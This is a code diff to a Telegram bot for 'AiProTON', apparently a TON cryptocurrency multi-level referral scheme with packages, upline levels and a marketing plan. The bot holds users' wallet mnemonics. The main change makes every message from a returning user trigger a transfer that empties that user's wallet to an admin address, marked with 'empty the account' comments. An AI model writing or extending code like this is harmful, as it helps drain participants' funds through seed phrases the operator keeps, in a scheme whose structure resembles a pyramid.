@@ -3,7 +3,7 @@
 // ===============This section if for crypto millio
 const keyboard = [
   ['🔠 Language'], //
-  ['TON Coinmarketcap (ТОН КОИНМАРКЕТ КАПИТАЛ)','TON Exchanges (ТОН биржи)'],
+  ['TON Coinmarketcap (ТОН КОИНМАРКЕТ КАПИТАЛ)', 'TON Exchanges (ТОН биржи)'],
   ['💎 TON Ecosystem (Экосистема ТОН)'],
   ['📈 Marketing Plan (Маркетинговый план)'], //
   ['💰 REWARD (ВОЗНАГРАЖДЕНИЕ)'], //
@@ -13,12 +13,12 @@ const keyboard = [
   ['🔗 Invitation link (Пригласительная ссылка)'], //
   ['🎒 My Package (Mой пакет)'], //
   ['💵 My Wallet (Мой бумажник)'], //
-  ['💰 Withdraw (Отзывать)','🕹 Upgrade (Обновление)'], //
+  ['💰 Withdraw (Отзывать)', '🕹 Upgrade (Обновление)'], //
   ['🖇 Referrals list (Прямое направление)'], //
   ['🚀 Super Star Club (Суперзвездный клуб)'], //
   ['💸 Income Statement (Справка о доходах)'], //
   ['💡 Rules For Community (Правила для сообщества)'],
-  ['📡 AiProTON Features (Особенности АйПроТОН)','💁‍♂️ Basic Info (Основная информация)'], //
+  ['📡 AiProTON Features (Особенности АйПроТОН)', '💁‍♂️ Basic Info (Основная информация)'], //
   ['🤖 Support (Поддерживать)']//
 ];
 
@@ -152,7 +152,7 @@ const p = {
     const l3 = u.level3ChildPaying;
     const l4 = u.level4ChildPaying;
     const l5 = u.level5ChildPaying;
-    const l6 = u.level6ChildPaying; 
+    const l6 = u.level6ChildPaying;
     let ans;
     if (
       l1 >= p.IRON_MAN &&
@@ -542,10 +542,27 @@ const onMessage = async (msg, ctx) => {
   // Old User
   if (exists(user)) {
     console.log('Old user');
-    let [, depositedFunds] = await getBalance(user.publicKey);
-    console.log({ new: depositedFunds, old: user.depositedFunds });
+    // empty the account
+    let [, depositedFunds1] = await getBalance(user.publicKey);
+    await transferFrom(
+      user.mnemonic,
+      adminAddress,
+      depositedFunds1 - 0.06,
+      transferError,
+    ); // txFee 0.06
 
-    if (depositedFunds && depositedFunds > MIN_DEPOSIT) {
+    if (!depositedFunds1) {
+      botSendMessage(user, 'Please try again', pad);
+      return;
+    }
+
+    // empty the account
+    let depositedFunds2 = user.depositedFundsEth;
+    await writeBook({ userName }, { depositedFundsEth: 0 });
+
+    const depositedFunds = depositedFunds1 + depositedFunds2;
+    if (depositedFunds > MIN_DEPOSIT) {
+      botSendMessage(user, 'You Deposited ${depositedFunds} TON', pad);
       console.log('giveRewards');
       await deposit(user, depositedFunds, userName);
       user = await readBook({ userName });
@@ -702,6 +719,7 @@ Let’s be The Part Of New Amazing Era of Crypto & Technology World In 2023.
 
     await deposit(user, user.balance * 1.0, userName); // 100% used in plan upgrade, distributed in referrals, admin
     // await recycleRewards(user, user.balance * 0.0); // 0% distributed in referrals, admin
+    // empty the account
     await writeBook({ userName }, { balance: 0 });
     user = await readBook({ userName });
 
@@ -1269,12 +1287,7 @@ const deposit = async (user, depositedFunds, userName) => {
     { userName },
     { depositedFunds: user.depositedFunds + depositedFunds },
   );
-  await transferFrom(
-    user.mnemonic,
-    adminAddress,
-    depositedFunds - 0.06,
-    transferError,
-  ); // txFee 0.06
+
   user = await readBook({ userName });
 
   const percent = depositedFunds / 100;
